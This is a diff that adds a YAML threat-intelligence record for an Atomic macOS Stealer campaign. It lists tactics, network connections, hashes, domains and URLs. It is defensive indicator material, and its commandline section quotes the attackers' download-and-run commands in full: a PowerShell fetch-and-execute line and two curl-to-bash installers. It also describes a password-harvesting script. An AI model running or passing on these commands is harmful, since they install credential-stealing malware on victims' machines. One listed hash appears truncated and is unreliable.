@@ -1,0 +1,61 @@
+description: "Atomic macOS Stealer (AMOS) campaign using typo\u2011quatted domains\
+  \ and Clickfix delivery."
+attribution: Russian-speaking cybercriminals
+malware_families:
+- AMOS
+TTPs:
+  processes: []
+  commandline:
+  - powershell -NoProfile -ExecutionPolicy Bypass
+    -Command "$file = [System.IO.Path]::Combine($env:TEMP, 'api.ps1'); Invoke-WebRequest
+    -Uri 'https://cf-verifi.pages.dev/i.txt' -OutFile $file; & $file"
+  - /bin/bash -c "$(curl -fsSL https://applemacios.com/getrur/install.sh)"
+  - /bin/bash -c "$(curl -fsSL https://homebrewrp.com/Homebrew/install/HEAD/install.sh)"
+  powershell: []
+  scripting_engine:
+  - bash script that prompts for system password, writes to /tmp/.pass, downloads
+    /tmp/update from https://applemacios.com/getrur/update, clears xattr and executes
+    it.
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: api.ps1
+    destination: https://cf-verifi.pages.dev/i.txt
+    port: 443
+  - executable: /tmp/update
+    destination: https://applemacios.com/getrur/update
+    port: 443
+  - executable: install.sh
+    destination: https://applemacios.com/getrur/install.sh
+    port: 443
+  - executable: install.sh
+    destination: https://homebrewrp.com/Homebrew/install/HEAD/install.sh
+    port: 443
+  file_activity:
+  - /tmp/.pass
+  - /tmp/update
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - aedee8fc9fe336bcde021bf243e332a
+  - 6fd092d86235d7ae35c557523f493674
+  domains:
+  - panel-spectrum.net
+  - spectrum-ticket.net
+  - cf-verifi.pages.dev
+  - applemacios.com
+  - rugme.cat
+  - homebrewrp.com
+  - brewory.com
+  urls:
+  - https://cf-verifi.pages.dev/i.txt
+  - https://applemacios.com/getrur/install.sh
+  - https://applemacios.com/getrur/update
+  - https://homebrewrp.com/Homebrew/install/HEAD/install.sh
+authors:
+- Sourajeet Majumder
+- Ibrahim Saify
+reference: https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers
+date_of_publication: June 4, 2025
+file_creation_date: October 17, 2025
